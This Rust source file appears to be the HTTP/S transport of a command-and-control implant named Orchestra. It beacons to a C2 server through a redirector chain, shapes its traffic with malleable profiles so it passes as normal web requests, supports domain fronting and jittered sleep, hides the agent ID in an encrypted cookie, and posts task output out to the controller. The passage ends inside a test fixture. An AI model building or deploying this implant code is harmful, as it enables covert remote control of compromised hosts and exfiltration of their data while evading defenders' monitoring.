//! HTTP/S malleable-profile transport for the Orchestra agent.
//!
//! # Status: EXPERIMENTAL — not wired into the default startup path
//!
//! This module implements a `Transport` that tunnels agent messages over
//! HTTP/S using a malleable C2 profile. All HTTP verb, URI, header, and
//! payload shaping is driven by the profile loaded from the agent-side
//! `malleable` module.
//!
//! ## Transform Pipeline
//!
//! **Outbound (client → server):**
//! 1. Apply the client transform (base64/mask/netbios/none)
//! 2. Prepend the configured prepend string
//! 3. Append the configured append string
//! 4. Set headers from the profile (with `{SESSIONID}` substitution)
//! 5. Apply metadata delivery (Cookie / UriAppend / Header / Body)
//!
//! **Inbound (server → client):**
//! 1. Strip prepend bytes from the response body
//! 2. Strip append bytes from the response body
//! 3. Apply the inverse server transform
//! 4. Decrypt with the session's XChaCha20-Poly1305 key
//!
//! ## Security
//!
//! - The `agent_id` is NEVER sent in plaintext — it goes through the
//!   metadata transform pipeline (base64/netbios/etc.) before transmission.
//! - SSL certificate pinning is enforced when `profile.ssl.cert_pin` is set.
//! - TLS SNI is set from `profile.ssl.sni`.

use anyhow::{anyhow, Result};
use async_trait::async_trait;
use base64::Engine;
use common::{CryptoSession, Message, Transport};
use sha2::{Digest, Sha256};
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;
use tokio::time::Duration;

use crate::malleable::{
    DeliveryMethod, HttpTransactionConfig, MalleableProfile as AgentMalleableProfile,
    TransformType,
};

// ── Redirector Configuration ─────────────────────────────────────────────────

/// Configuration for a single redirector hop in the C2 chain.
///
/// Redirectors are intermediate servers that forward agent traffic to the
/// true C2 server. The agent sends the same malleable-formatted request to
/// each redirector as it would to the C2 server directly — the malleable
/// profile ensures traffic looks legitimate at every hop.
#[derive(Clone, Debug)]
pub struct RedirectorConfig {
    /// URL of the redirector (e.g. "https://cdn-linked-in.example.com").
    pub url: String,
    /// Additional headers to add when talking to this redirector.
    pub headers: std::collections::HashMap<String, String>,
    /// Which malleable profile this redirector expects.
    pub profile_name: String,
}

/// Tracks which endpoint the agent is currently using for sticky sessions.
#[derive(Clone, Debug)]
enum ActiveEndpoint {
    /// Use a specific redirector by index.
    Redirector(usize),
    /// Fall back to direct C2 connection.
    DirectC2,
}

/// Connection strategy state for the redirector chain.
struct FailoverState {
    /// Ordered list of redirectors to try.
    redirectors: Vec<RedirectorConfig>,
    /// The direct C2 URL (last resort).
    direct_c2_url: String,
    /// Currently active endpoint (sticky session).
    active: ActiveEndpoint,
    /// How many successful consecutive checkins on the active endpoint.
    /// Resets to 0 on failure. Stick for 10 checkins before reconsidering.
    sticky_count: usize,
    /// Exponential backoff state in seconds. Resets on success.
    backoff_secs: u64,
}

impl FailoverState {
    const STICKY_LIMIT: usize = 10;
    const MAX_BACKOFF_SECS: u64 = 60;

    fn new(redirectors: Vec<RedirectorConfig>, direct_c2_url: String) -> Self {
        let active = if redirectors.is_empty() {
            ActiveEndpoint::DirectC2
        } else {
            ActiveEndpoint::Redirector(0)
        };
        Self {
            redirectors,
            direct_c2_url,
            active,
            sticky_count: 0,
            backoff_secs: 1,
        }
    }

    /// Get the current endpoint URL.
    fn current_url(&self) -> &str {
        match &self.active {
            ActiveEndpoint::Redirector(idx) => {
                &self.redirectors[*idx].url
            }
            ActiveEndpoint::DirectC2 => &self.direct_c2_url,
        }
    }

    /// Get extra headers for the current endpoint.
    fn current_headers(&self) -> Option<&std::collections::HashMap<String, String>> {
        match &self.active {
            ActiveEndpoint::Redirector(idx) => {
                Some(&self.redirectors[*idx].headers)
            }
            ActiveEndpoint::DirectC2 => None,
        }
    }

    /// Record a successful connection. Resets backoff, increments sticky counter.
    fn record_success(&mut self) {
        self.backoff_secs = 1;
        self.sticky_count += 1;
        log::debug!(
            "connection success on {:?} (sticky {}/{})",
            self.active_variant_str(),
            self.sticky_count,
            Self::STICKY_LIMIT,
        );
    }

    /// Record a failure and advance to the next endpoint.
    /// Returns the backoff duration to wait before retrying.
    fn record_failure_and_advance(&mut self) -> Duration {
        log::warn!(
            "connection failed on {}; advancing to next endpoint",
            self.current_url(),
        );

        match &self.active {
            ActiveEndpoint::Redirector(idx) => {
                let next = *idx + 1;
                if next < self.redirectors.len() {
                    self.active = ActiveEndpoint::Redirector(next);
                } else {
                    self.active = ActiveEndpoint::DirectC2;
                }
            }
            ActiveEndpoint::DirectC2 => {
                // Wrapped around — start from redirector[0] again.
                if !self.redirectors.is_empty() {
                    self.active = ActiveEndpoint::Redirector(0);
                }
            }
        }

        self.sticky_count = 0;
        let backoff = Duration::from_secs(self.backoff_secs);
        self.backoff_secs = (self.backoff_secs * 2).min(Self::MAX_BACKOFF_SECS);
        backoff
    }

    /// Check if we should stick with the current endpoint or reconsider.
    /// Called at the start of each checkin cycle.
    fn maybe_reconsider(&mut self) {
        if self.sticky_count >= Self::STICKY_LIMIT {
            // Reset sticky counter; stay on the same endpoint.
            self.sticky_count = 0;
            log::debug!(
                "sticky limit reached on {}; resetting counter",
                self.current_url(),
            );
        }
    }

    /// Check if all endpoints have been exhausted (full cycle completed).
    /// If so, apply exponential backoff before the next full retry.
    fn is_full_cycle(&self) -> bool {
        matches!(self.active, ActiveEndpoint::DirectC2) && self.redirectors.is_empty()
            || matches!(self.active, ActiveEndpoint::Redirector(0)) && self.sticky_count == 0
    }

    fn active_variant_str(&self) -> &'static str {
        match &self.active {
            ActiveEndpoint::Redirector(_) => "redirector",
            ActiveEndpoint::DirectC2 => "direct-c2",
        }
    }
}

/// Verify that the current date is before the kill date.
/// `kill_date` must be in `YYYY-MM-DD` format (UTC).
fn check_kill_date(kill_date: &str) -> Result<()> {
    check_kill_date_pub(kill_date)
}

/// Public wrapper around kill-date enforcement.
/// Delegates to the shared implementation in `config` to avoid duplication.
pub fn check_kill_date_pub(kill_date: &str) -> Result<()> {
    crate::config::check_kill_date(kill_date)
}

/// Convert days since the Unix epoch (1970-01-01) to (year, month, day).
/// Kept for backward compat with any external callers; delegates to config.
#[allow(dead_code)]
fn days_to_ymd(days: u64) -> (u32, u32, u32) {
    // Algorithm: http://howardhinnant.github.io/date_algorithms.html#civil_from_days
    let z = days as i64 + 719468;
    let era = if z >= 0 { z } else { z - 146096 } / 146097;
    let doe = (z - era * 146097) as u64;
    let yoe = (doe - doe / 1460 + doe / 36524 - doe / 146096) / 365;
    let y = yoe as i64 + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let m = if mp < 10 { mp + 3 } else { mp - 9 };
    let y = if m <= 2 { y + 1 } else { y };
    (y as u32, m as u32, d as u32)
}

/// Custom `ServerCertVerifier` that pins the server certificate by its
/// SHA-256 fingerprint (64 lowercase hex characters).  If the presented
/// end-entity certificate's DER encoding does not hash to the expected
/// fingerprint, the TLS handshake is rejected.
///
/// When `expected_fingerprint` is `None`, the verifier delegates to rustls's
/// built-in `WebPkiVerifier` with platform root certificates — i.e. standard
/// CA-based verification.
struct FingerprintVerifier {
    expected_fingerprint: Option<String>,
    webpki: rustls_0_21::client::WebPkiVerifier,
}

impl FingerprintVerifier {
    fn new(expected_fingerprint: Option<String>) -> Self {
        let mut root_store = rustls_0_21::RootCertStore::empty();
        for cert in rustls_native_certs::load_native_certs()
            .certs
            .into_iter()
            .map(|c| rustls_0_21::Certificate(c.as_ref().to_vec()))
        {
            root_store.add(&cert).ok();
        }
        let webpki = rustls_0_21::client::WebPkiVerifier::new(root_store, None);
        Self {
            expected_fingerprint,
            webpki,
        }
    }
}

impl rustls_0_21::client::ServerCertVerifier for FingerprintVerifier {
    fn verify_server_cert(
        &self,
        end_entity: &rustls_0_21::Certificate,
        intermediates: &[rustls_0_21::Certificate],
        server_name: &rustls_0_21::ServerName,
        scts: &mut dyn Iterator<Item = &[u8]>,
        ocsp_response: &[u8],
        now: std::time::SystemTime,
    ) -> Result<rustls_0_21::client::ServerCertVerified, rustls_0_21::Error> {
        // Always compute the fingerprint of the end-entity certificate.
        let digest = Sha256::digest(&end_entity.0);
        let hex_fp = hex::encode(digest);

        if let Some(ref expected) = self.expected_fingerprint {
            // Certificate pinning mode: compare fingerprints.
            if hex_fp != expected.to_lowercase() {
                log::error!(
                    "cert pinning: fingerprint mismatch (got {}, expected {})",
                    hex_fp,
                    expected
                );
                return Err(rustls_0_21::Error::InvalidCertificate(
                    rustls_0_21::CertificateError::UnknownIssuer,
                ));
            }
            // Fingerprint matches — accept the certificate without CA chain
            // validation since we are pinning the exact cert.
            log::debug!("cert pinning: fingerprint verified OK");
            Ok(rustls_0_21::client::ServerCertVerified::assertion())
        } else {
            // No fingerprint configured — fall back to standard WebPKI verification.
            self.webpki
                .verify_server_cert(end_entity, intermediates, server_name, scts, ocsp_response, now)
        }
    }

    fn verify_tls12_signature(
        &self,
        message: &[u8],
        cert: &rustls_0_21::Certificate,
        dss: &rustls_0_21::DigitallySignedStruct,
    ) -> Result<rustls_0_21::client::HandshakeSignatureValid, rustls_0_21::Error> {
        self.webpki.verify_tls12_signature(message, cert, dss)
    }

    fn verify_tls13_signature(
        &self,
        message: &[u8],
        cert: &rustls_0_21::Certificate,
        dss: &rustls_0_21::DigitallySignedStruct,
    ) -> Result<rustls_0_21::client::HandshakeSignatureValid, rustls_0_21::Error> {
        self.webpki.verify_tls13_signature(message, cert, dss)
    }
}

// ── HTTP Transport ───────────────────────────────────────────────────────────

/// HTTP/S transport driven by a malleable C2 profile.
///
/// All URI selection, verb choice, header construction, and payload
/// transformation come from the profile. The agent never hardcodes
/// traffic patterns.
///
/// ## Redirector Chain
///
/// When redirectors are configured, the agent tries them in order for each
/// checkin. On failure, it advances to the next redirector. The last resort
/// is the direct C2 URL. On success, the agent "sticks" to that endpoint
/// for the next 10 checkins (sticky session), then resets.
///
/// ## Domain Fronting
///
/// When `front_domain` is set, the TLS SNI is set to the front domain
/// (e.g. "cdn.azure.com") while the HTTP Host header carries the actual
/// redirector/C2 domain. This requires the redirector to be hosted on a
/// CDN that supports domain fronting.
pub struct HttpTransport {
    profile: Arc<AgentMalleableProfile>,
    client: reqwest::Client,
    session: CryptoSession,
    agent_id: String,
    /// Round-robin index for http_get URI rotation.
    get_uri_idx: AtomicUsize,
    /// Round-robin index for http_post URI rotation.
    post_uri_idx: AtomicUsize,
    /// Consecutive transform-decode failure counter.  After 3 failures,
    /// the transport rotates to the next URI in the pool.
    consecutive_failures: AtomicUsize,
    /// Legacy config fields for kill_date / CDN relay resolution.
    kill_date: String,
    cdn_relay: bool,
    cdn_endpoint: String,
    direct_c2_endpoint: String,
    host_header: String,
    /// Domain fronting: if set, TLS SNI uses this domain while the Host
    /// header carries the actual C2/redirector domain.
    front_domain: Option<String>,
    /// Redirector chain failover state.
    failover: std::sync::Mutex<FailoverState>,
}

impl HttpTransport {
    /// Create a new HTTP transport from a malleable profile.
    ///
    /// The `common_profile` parameter provides legacy fields (kill_date,
    /// CDN relay, endpoints) that are not yet part of the malleable profile
    /// struct. In a full refactor these would be folded into the profile.
    pub async fn new(
        profile: Option<&AgentMalleableProfile>,
        session: CryptoSession,
        agent_id: String,
        common_profile: Option<&common::config::MalleableProfile>,
        redirectors: Vec<RedirectorConfig>,
        front_domain: Option<String>,
    ) -> Result<Self> {
        let profile = profile.cloned().unwrap_or_default();
        // Extract legacy config fields if provided.
        let kill_date = common_profile
            .map(|p| p.kill_date.clone())
            .unwrap_or_default();
        let cdn_relay = common_profile.map(|p| p.cdn_relay).unwrap_or(false);
        let cdn_endpoint = common_profile
            .map(|p| p.cdn_endpoint.clone())
            .unwrap_or_default();
        let direct_c2_endpoint = common_profile
            .map(|p| p.direct_c2_endpoint.clone())
            .unwrap_or_default();
        let host_header = common_profile
            .map(|p| p.host_header.clone())
            .unwrap_or_default();

        // Enforce kill date.
        if !kill_date.is_empty() {
            check_kill_date(&kill_date)?;
        }

        // Build default headers from the legacy config.
        let mut headers = reqwest::header::HeaderMap::new();
        if !host_header.is_empty() {
            headers.insert(
                reqwest::header::HOST,
                reqwest::header::HeaderValue::from_str(&host_header)?,
            );
        }

        // Build the reqwest client with TLS configuration from the profile.
        let cert_fingerprint = if profile.has_cert_pin() {
            Some(profile.ssl.cert_pin.clone())
        } else {
            None
        };

        // If domain fronting is configured, we must use a TLS client that
        // sends the front_domain as SNI but resolves to the actual endpoint.
        // reqwest doesn't support split SNI/resolution natively, so we use
        // the front_domain as the TLS SNI via a custom connector.
        let client = if cert_fingerprint.is_some() {
            let verifier = FingerprintVerifier::new(cert_fingerprint);
            let config = rustls_0_21::ClientConfig::builder()
                .with_safe_defaults()
                .with_custom_certificate_verifier(Arc::new(verifier))
                .with_no_client_auth();
            reqwest::Client::builder()
                .use_preconfigured_tls(config)
                .default_headers(headers)
                .build()?
        } else {
            reqwest::Client::builder()
                .use_rustls_tls()
                .default_headers(headers)
                .build()?
        };

        // Determine the direct C2 URL (last resort in the failover chain).
        let direct_url = if cdn_relay && !cdn_endpoint.is_empty() {
            format!("https://{}", cdn_endpoint)
        } else if !direct_c2_endpoint.is_empty() {
            direct_c2_endpoint.clone()
        } else {
            // Fallback: no explicit C2 URL configured.
            String::new()
        };

        let failover = FailoverState::new(redirectors, direct_url);

        Ok(Self {
            profile: Arc::new(profile.clone()),
            client,
            session,
            agent_id,
            get_uri_idx: AtomicUsize::new(0),
            post_uri_idx: AtomicUsize::new(0),
            consecutive_failures: AtomicUsize::new(0),
            kill_date,
            cdn_relay,
            cdn_endpoint,
            direct_c2_endpoint,
            host_header,
            front_domain,
            failover: std::sync::Mutex::new(failover),
        })
    }

    /// Resolve the base endpoint URL with redirector chain awareness.
    ///
    /// Returns the URL of the current endpoint (redirector or direct C2),
    /// applying sticky session logic and domain fronting as needed.
    fn resolve_endpoint(&self) -> Result<String> {
        let mut failover = self.failover.lock().unwrap();
        failover.maybe_reconsider();
        let url = failover.current_url().to_string();
        if url.is_empty() {
            anyhow::bail!(
                "no C2 endpoint available; configure redirectors or direct_c2_endpoint"
            );
        }
        Ok(url)
    }

    /// Build a request with domain-fronting support if configured.
    ///
    /// When `front_domain` is set, the TLS SNI will use the front domain
    /// while the Host header carries the actual C2/redirector domain.
    /// reqwest uses the URL for TLS SNI, so we must rewrite the URL to
    /// use the front_domain for the hostname, then set Host explicitly.
    fn build_fronted_request(
        &self,
        method: reqwest::Method,
        url: &str,
    ) -> reqwest::RequestBuilder {
        if let Some(ref front) = self.front_domain {
            // Parse the URL to extract the path/query/fragment.
            let parsed: url::Url = url.parse().unwrap_or_else(|_| {
                format!("https://{}", url).parse().unwrap()
            });
            let actual_host = parsed
                .host_str()
                .unwrap_or("")
                .to_string();

            // Rewrite URL with the front domain as the hostname.
            let mut fronted = parsed.clone();
            fronted.set_host(Some(front)).ok();

            let req = self.client.request(method, fronted);
            // Set Host header to the actual C2/redirector domain.
            req.header("Host", &actual_host)
        } else {
            let full = if url.starts_with("http://") || url.starts_with("https://") {
                url.to_string()
            } else {
                format!("https://{}", url)
            };
            self.client.request(
                reqwest::Method::GET,
                &full,
            )
        }
    }

    /// Build a request for a given endpoint with optional redirector headers
    /// and domain fronting.
    fn build_request_for_endpoint(
        &self,
        method: reqwest::Method,
        endpoint: &str,
        uri: &str,
    ) -> reqwest::RequestBuilder {
        let full_url = format!("{}{}", endpoint, uri);

        let req = if self.front_domain.is_some() {
            let method_clone = method.clone();
            self.build_fronted_request(method, &full_url)
        } else {
            let url = if full_url.starts_with("http://") || full_url.starts_with("https://") {
                full_url.clone()
            } else {
                format!("https://{}", full_url)
            };
            self.client.request(method, &url)
        };

        // Apply redirector-specific headers if active endpoint is a redirector.
        let failover = self.failover.lock().unwrap();
        if let Some(extra_headers) = failover.current_headers() {
            let mut req = req;
            for (k, v) in extra_headers {
                req = req.header(k.as_str(), v.as_str());
            }
            req
        } else {
            req
        }
    }

    /// Select the next URI via round-robin from the transaction config.
    fn next_uri(txn: &HttpTransactionConfig, idx: &AtomicUsize) -> String {
        if txn.uri.is_empty() {
            return "/".to_string();
        }
        let i = idx.fetch_add(1, Ordering::Relaxed) % txn.uri.len();
        txn.uri[i].clone()
    }

    /// Apply the **client** (outbound) transform pipeline:
    ///   transform(payload) → prepend → append
    fn apply_client_transform(
        txn: &HttpTransactionConfig,
        payload: &[u8],
    ) -> Vec<u8> {
        let transformed = if txn.client.mask_stride > 0 {
            txn.client
                .transform
                .encode_with_mask_stride(payload, txn.client.mask_stride)
        } else {
            txn.client.transform.encode(payload)
        };

        let prepend_bytes = Self::unescape_crlf(&txn.client.prepend);
        let append_bytes = Self::unescape_crlf(&txn.client.append);

        let mut out =
            Vec::with_capacity(prepend_bytes.len() + transformed.len() + append_bytes.len());
        out.extend_from_slice(&prepend_bytes);
        out.extend_from_slice(&transformed);
        out.extend_from_slice(&append_bytes);
        out
    }

    /// Reverse the **server** (inbound) transform pipeline:
    ///   strip prepend → strip append → inverse transform
    fn reverse_server_transform(
        txn: &HttpTransactionConfig,
        data: &[u8],
    ) -> Result<Vec<u8>> {
        let prepend_bytes = Self::unescape_crlf(&txn.server.prepend);
        let append_bytes = Self::unescape_crlf(&txn.server.append);

        // Strip prepend from the beginning.
        let rest = if !prepend_bytes.is_empty()
            && data.len() >= prepend_bytes.len()
            && &data[..prepend_bytes.len()] == prepend_bytes.as_slice()
        {
            &data[prepend_bytes.len()..]
        } else {
            data
        };

        // Strip append from the end.
        let core = if !append_bytes.is_empty()
            && rest.len() >= append_bytes.len()
            && &rest[rest.len() - append_bytes.len()..] == append_bytes.as_slice()
        {
            &rest[..rest.len() - append_bytes.len()]
        } else {
            rest
        };

        // Apply the inverse transform.
        if txn.server.mask_stride > 0 {
            txn.server
                .transform
                .decode_with_mask_stride(core, txn.server.mask_stride)
        } else {
            txn.server.transform.decode(core)
        }
    }

    /// Convert escaped `\r\n` sequences in a string to actual CRLF bytes.
    ///
    /// The profile TOML may use literal `\r\n` two-character sequences
    /// (since TOML strings don't support CRLF escapes). This function
    /// converts those to real `\r\n` bytes.
    fn unescape_crlf(s: &str) -> Vec<u8> {
        if !s.contains("\\r") && !s.contains("\\n") {
            return s.as_bytes().to_vec();
        }
        let replaced = s
            .replace("\\r\\n", "\r\n")
            .replace("\\r", "\r")
            .replace("\\n", "\n");
        replaced.into_bytes()
    }

    /// Build the encrypted session token for the agent_id.
    ///
    /// The agent_id is encrypted with the session's XChaCha20-Poly1305 key,
    /// then base64 encoded. It is NEVER sent in plaintext.
    fn encrypt_agent_id(&self) -> String {
        let ciphertext = self.session.encrypt(self.agent_id.as_bytes());
        base64::engine::general_purpose::STANDARD.encode(&ciphertext)
    }

    /// Apply the metadata delivery mechanism to embed the agent identifier.
    ///
    /// The encrypted agent_id is placed according to the delivery method
    /// (Cookie, UriAppend, Header, Body) using a default base64 transform.
    fn apply_metadata_delivery(
        &self,
        req: reqwest::RequestBuilder,
        encrypted_id: &str,
        uri: &mut String,
        body: &mut Vec<u8>,
    ) -> reqwest::RequestBuilder {
        // Default delivery: Cookie named "session" with base64-encoded ID.
        let delivery = DeliveryMethod::Cookie;
        let key = "session";
        let transform = TransformType::Base64;

        // Apply the metadata transform to the encrypted ID.
        let transformed_id = transform.encode(encrypted_id.as_bytes());
        let transformed_str = String::from_utf8_lossy(&transformed_id).to_string();

        match delivery {
            DeliveryMethod::Cookie => {
                req.header("Cookie", format!("{}={}", key, transformed_str))
            }
            DeliveryMethod::UriAppend => {
                uri.push_str(&format!("?{}={}", key, transformed_str));
                req
            }
            DeliveryMethod::Header => req.header(key, &transformed_str),
            DeliveryMethod::Body => {
                // Prepend the transformed ID to the body.
                let mut new_body = transformed_id;
                new_body.extend_from_slice(body);
                *body = new_body;
                req
            }
        }
    }

    /// Apply profile headers to a request builder, substituting placeholders.
    fn apply_profile_headers(
        &self,
        txn: &HttpTransactionConfig,
        req: reqwest::RequestBuilder,
        session_token: &str,
    ) -> reqwest::RequestBuilder {
        let headers = txn.build_headers(session_token);
        let mut req = req;

        // Always set User-Agent from the profile's global config.
        req = req.header("User-Agent", &self.profile.global.user_agent);

        // Set all profile-defined headers.
        for (key, value) in &headers {
            // Skip User-Agent since we already set it from global config.
            if key.eq_ignore_ascii_case("User-Agent") {
                continue;
            }
            req = req.header(key.as_str(), value.as_str());
        }

        req
    }

    /// Calculate jittered sleep duration from the profile.
    fn jittered_sleep(&self) -> Duration {
        self.profile.jittered_sleep()
    }

    /// Rotate the URI index for the given transaction type after failures.
    fn rotate_uri_on_failure(&self, transaction_type: &str) {
        match transaction_type {
            "http_get" => {
                let _ = self.get_uri_idx.fetch_add(1, Ordering::Relaxed);
            }
            "http_post" => {
                let _ = self.post_uri_idx.fetch_add(1, Ordering::Relaxed);
            }
            _ => {}
        }
    }

    /// Connect with retry logic. On transform failures, rotates to next URI.
    async fn connect_with_retry(
        &self,
        req_builder: reqwest::RequestBuilder,
        transaction_type: &str,
    ) -> Result<reqwest::Response> {
        let mut delay = 1;
        let mut attempt = 0u32;
        const MAX_ATTEMPTS: u32 = 8;

        loop {
            attempt += 1;
            if attempt > MAX_ATTEMPTS {
                anyhow::bail!("C2 unreachable after {} attempts; giving up", MAX_ATTEMPTS);
            }

            // Apply jitter to backoff.
            let jitter = rand::random::<f64>() * 0.2 + 0.9;
            let current_delay = (delay as f64 * jitter) as u64;

            match req_builder
                .try_clone()
                .ok_or_else(|| anyhow!("Failed to clone request"))?
                .send()
                .await
            {
                Ok(resp) => {
                    // Reset failure counter on success.
                    self.consecutive_failures.store(0, Ordering::Relaxed);
                    return Ok(resp);
                }
                Err(e) => {
                    log::warn!(
                        "HTTP connection failed: {}. Retrying in {}s...",
                        e,
                        current_delay
                    );
                    crate::memory_guard::guarded_sleep(
                        Duration::from_secs(current_delay),
                        None,
                        0,
                    )
                    .await?;
                    delay *= 2;
                    if delay > 64 {
                        delay = 64;
                    }
                }
            }
        }
    }
}

#[async_trait]
impl Transport for HttpTransport {
    async fn send(&mut self, msg: Message) -> Result<()> {
        log::debug!("Malleable HTTP C2 Send (result delivery)");

        let endpoint = self.resolve_endpoint()?;

        // Use http_post for task output.
        let txn = self
            .profile
            .http_post
            .as_ref()
            .ok_or_else(|| anyhow!("http_post transaction not configured in malleable profile"))?;

        let uri = Self::next_uri(txn, &self.post_uri_idx);

        // Serialize and encrypt payload through the session's forward-secrecy layer.
        let serialized = bincode::serialize(&msg)?;
        let ciphertext = self.session.encrypt(&serialized);

        // Apply the client transform pipeline.
        let transformed = Self::apply_client_transform(txn, &ciphertext);

        // Build the encrypted agent ID (never sent plaintext).
        let encrypted_id = self.encrypt_agent_id();

        // Prepare mutable URI and body for metadata delivery.
        let mut final_uri = uri.clone();
        let mut body = transformed;

        // Build the request with the profile's verb, using domain-fronting
        // and redirector headers as needed.
        let method = reqwest::Method::from_bytes(txn.verb.as_bytes())
            .unwrap_or(reqwest::Method::POST);
        let req = self.build_request_for_endpoint(method.clone(), &endpoint, &final_uri);

        // Apply profile headers.
        let req = self.apply_profile_headers(txn, req, &encrypted_id);

        // Apply metadata delivery (Cookie / UriAppend / Header / Body).
        let req = self.apply_metadata_delivery(req, &encrypted_id, &mut final_uri, &mut body);

        // If metadata delivery modified the URI (UriAppend), rebuild the request
        // with the updated URI.
        let req = if final_uri != uri {
            self.build_request_for_endpoint(method, &endpoint, &final_uri)
        } else {
            req
        };

        let req = req.body(body);

        let result = self.connect_with_retry(req, "http_post").await;
        match result {
            Ok(resp) => {
                // Record success for sticky session.
                self.failover.lock().unwrap().record_success();
                if !resp.status().is_success() {
                    anyhow::bail!("C2 POST returned HTTP {}", resp.status());
                }
                Ok(())
            }
            Err(e) => {
                // Record failure and advance to next endpoint.
                let backoff = {
                    let mut fo = self.failover.lock().unwrap();
                    fo.record_failure_and_advance()
                };
                log::warn!(
                    "send failed on {}: {}. Backing off {:?}",
                    endpoint, e, backoff,
                );
                crate::memory_guard::guarded_sleep(backoff, None, 0).await?;
                Err(e)
            }
        }
    }

    async fn recv(&mut self) -> Result<Message> {
        log::debug!("Malleable HTTP C2 Recv (task fetch)");

        let endpoint = self.resolve_endpoint()?;

        // Use http_get for checkins/tasking.
        let txn = self
            .profile
            .http_get
            .as_ref()
            .ok_or_else(|| anyhow!("http_get transaction not configured in malleable profile"))?;

        let uri = Self::next_uri(txn, &self.get_uri_idx);

        // ── OPSEC: agent_id is never transmitted in plaintext. ─────────
        //
        // The agent_id is encrypted with the session's XChaCha20-Poly1305 key,
        // then base64 encoded. The resulting ciphertext goes through the
        // metadata delivery pipeline (Cookie/UriAppend/Header/Body).
        let encrypted_id = self.encrypt_agent_id();

        // Build the encrypted check-in payload containing the agent_id.
        // This is the Heartbeat message that the server uses to identify the agent.
        let heartbeat = Message::Heartbeat {
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs(),
            agent_id: self.agent_id.clone(),
            status: "idle".to_string(),
        };
        let serialized = bincode::serialize(&heartbeat)?;
        let ciphertext = self.session.encrypt(&serialized);

        // Apply the client transform pipeline to the checkin payload.
        let transformed = Self::apply_client_transform(txn, &ciphertext);

        // Prepare mutable URI and body for metadata delivery.
        let mut final_uri = uri.clone();
        let mut body = transformed;

        // Build the request with the profile's verb, using domain-fronting
        // and redirector headers as needed.
        let method = reqwest::Method::from_bytes(txn.verb.as_bytes())
            .unwrap_or(reqwest::Method::GET);
        let req = self.build_request_for_endpoint(method.clone(), &endpoint, &final_uri);

        // Apply profile headers.
        let req = self.apply_profile_headers(txn, req, &encrypted_id);

        // Apply metadata delivery.
        let req = self.apply_metadata_delivery(req, &encrypted_id, &mut final_uri, &mut body);

        // Rebuild with updated URI if metadata delivery changed it.
        let req = if final_uri != uri {
            self.build_request_for_endpoint(method, &endpoint, &final_uri)
        } else {
            req
        };

        let req = req.body(body);

        let result = self.connect_with_retry(req, "http_get").await;
        let resp = match result {
            Ok(resp) => {
                // Record success for sticky session.
                self.failover.lock().unwrap().record_success();
                resp
            }
            Err(e) => {
                // Record failure and advance to next endpoint.
                let backoff = {
                    let mut fo = self.failover.lock().unwrap();
                    fo.record_failure_and_advance()
                };
                log::warn!(
                    "recv failed on {}: {}. Backing off {:?}",
                    endpoint, e, backoff,
                );
                crate::memory_guard::guarded_sleep(backoff, None, 0).await?;
                anyhow::bail!("recv failed after advancing endpoint: {}", e);
            }
        };

        let bytes = resp.bytes().await?;

        if bytes.is_empty() {
            // No tasking: sleep with profile jitter, then signal the caller
            // with a Heartbeat so the main loop continues.
            let sleep_dur = self.jittered_sleep();
            crate::memory_guard::guarded_sleep(sleep_dur, None, 0).await?;
            return Ok(Message::Heartbeat {
                timestamp: std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs(),
                agent_id: self.agent_id.clone(),
                status: "idle".to_string(),
            });
        }

        // Reverse the server transform pipeline.
        let server_payload = match Self::reverse_server_transform(txn, &bytes) {
            Ok(p) => p,
            Err(e) => {
                // Transform decode failure — increment failure counter.
                let failures = self.consecutive_failures.fetch_add(1, Ordering::Relaxed) + 1;
                log::warn!(
                    "server transform decode failed (attempt {}): {}. Rotating URI.",
                    failures,
                    e
                );
                if failures >= 3 {
                    self.rotate_uri_on_failure("http_get");
                    self.consecutive_failures.store(0, Ordering::Relaxed);
                }
                anyhow::bail!("server transform decode failed: {}", e);
            }
        };

        // Decrypt with the session's forward-secrecy key.
        let plaintext = match self.session.decrypt(&server_payload) {
            Ok(p) => p,
            Err(e) => {
                let failures = self.consecutive_failures.fetch_add(1, Ordering::Relaxed) + 1;
                log::warn!(
                    "session decrypt failed (attempt {}): {}. Rotating URI.",
                    failures,
                    e
                );
                if failures >= 3 {
                    self.rotate_uri_on_failure("http_get");
                    self.consecutive_failures.store(0, Ordering::Relaxed);
                }
                anyhow::bail!("session decrypt failed: {}", e);
            }
        };

        let msg = bincode::deserialize(&plaintext)?;
        Ok(msg)
    }
}

// ── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use crate::malleable::{
        GlobalConfig, HttpTransformConfig, MalleableProfile as AgentMalleableProfile,
        ProfileInfo, SslConfig,
    };
    use std::collections::HashMap;

    /// Build a minimal test profile.
    fn test_profile() -> AgentMalleableProfile {
        AgentMalleableProfile {
            profile: ProfileInfo {
                name: "test".to_string(),
                author: "tester".to_string(),
                description: "test profile".to_string(),
            },
            global: GlobalConfig {
                user_agent: "TestAgent/1.0".to_string(),
                jitter: 10,
                sleep_time: 30,
                dns_idle: "0.0.0.0".to_string(),
                dns_sleep: 0,
            },
            ssl: SslConfig {
                enabled: false,
                cert_pin: String::new(),
                ja3_fingerprint: String::new(),
                sni: String::new(),
            },
            http_get: Some(HttpTransactionConfig {
                uri: vec![
                    "/api/v1/data".to_string(),
                    "/static/asset.js".to_string(),
                ],
                verb: "GET".to_string(),
                headers: {
                    let mut m = HashMap::new();
                    m.insert("Accept".to_string(), "application/json".to_string());
                    m.insert("Cookie".to_string(), "sid={SESSIONID}".to_string());
                    m
                },
                client: HttpTransformConfig {
                    prepend: "PRE_".to_string(),
                    append: "_POST".to_string(),
                    transform: TransformType::Base64,
                    mask_stride: 0,
                },
                server: HttpTransformConfig {
                    prepend: "SRV_PRE_".to_string(),
                    append: "_SRV_POST".to_string(),
                    transform: TransformType::Base64,
                    mask_stride: 0,
                },
            }),
            http_post: Some(HttpTransactionConfig {
                uri: vec!["/api/v1/upload".to_string()],
                verb: "POST".to_string(),
                headers: {
                    let mut m = HashMap::new();
                    m.insert(
                        "Content-Type".to_string(),
                        "application/json".to_string(),
                    );
                    m
                },
                client: HttpTransformConfig {
                    prepend: String::new(),
                    append: String::new(),
                    transform: TransformType::Base64,
                    mask_stride: 0,
                },
                server: HttpTransformConfig {
                    prepend: String::new(),
